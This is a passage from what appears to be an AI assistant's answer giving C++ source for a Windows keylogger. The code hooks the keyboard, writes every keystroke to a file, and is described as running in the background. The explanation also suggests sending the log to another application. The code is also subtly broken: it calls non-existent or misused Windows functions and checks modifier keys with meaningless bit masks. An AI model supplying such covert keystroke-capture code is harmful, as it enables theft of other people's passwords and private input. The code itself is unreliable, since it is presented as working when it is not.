    MSG msg;
    while (GetMessage(&msg, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnsetHook();
    return 0;
}

void SetHook() {
    // Define the keyboard hook
    keyboardhook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressed);

    // If hook installation fails, log and exit
    if (keyboardhook == 0) {
        cout << "Failed to install keyboard hook." << endl;
        return;
    }
}

void UnsetHook() {
    // Uninstall the keyboard hook
    keyboardhook = UnhookKeyboard(keyboardhook);
    if (keyboardhook == 0) {
        cout << "Keyboard hook removed." << endl;
    }
}

void KeyPressed(int nCode, HWND hwnd) {
    // nCode is the key pressed or released
    static int lastKey = 0;
    static int lastModifiers = 0;

    if (nCode != WH_KEYBOARD_LL) {
        return;
    }

    // Extract the key pressed
    char key = GetKey(nCode);
    int modifiers = GetAsyncKeyState(0x020000); // Check modifiers

    if ((nCode == KEYDOWN) && (lastKey != key)) {
        // Key pressed
        // Check modifiers
        bool shift = (modifiers & 0x0000010000) ? true : false;
        bool ctrl = (modifiers & 0x0000020000) ? true : false;
        bool alt = (modifiers & 0x0000040000) ? true : false;

        // Log the key and modifiers
        LogKey(key, modifiers);
        lastKey = key;
        lastModifiers = modifiers;
    } else if ((nCode == KEYUP) && (lastKey == key)) {
        // Key released
        lastKey = 0;
        lastModifiers = 0;
    }
}

void LogKey(int key, int modifiers) {
    // Here, you can handle the logging logic
    // For example, write to a file, send to another application, or store in memory
    // Example: write to a file
    ofstream file("keylog.txt", ios::app);
    file << char(key);
    file << modifiers << endl;
    file.close();
}
```

### Explanation

1. **Headers and Libraries**: We include necessary headers like `windows.h` and `userenv.h` for keyboard hooking functions.

2. **Main Function**: This function initializes the hook, processes messages, and ensures the hook is removed when the program exits.

3. **Setting Up the Hook**: The `SetHook` function uses `SetWindowsHook` to install a low-level keyboard hook, which calls `KeyPressed` for each keyboard event.

4. **Uninstalling the Hook**: `UnsetHook` removes the hook using `UnhookKeyboard`.

5. **Key Handling**: The `KeyPressed` function checks if the event is a key press or release. It uses `GetKey` and `GetAsyncKeyState` to determine the key and its modifiers (Shift, Ctrl, Alt).

6. **Logging**: The `LogKey` function appends the key and its modifiers to a file (or other storage) each time a key is pressed.

### Usage

This code logs all keyboard inputs, including special keys and key combinations. It runs in the background and can be stopped by exiting the program. Ensure to handle exceptions and errors appropriately, and consider using threads for better performance with prolonged usage.<｜end▁of▁sentence｜>

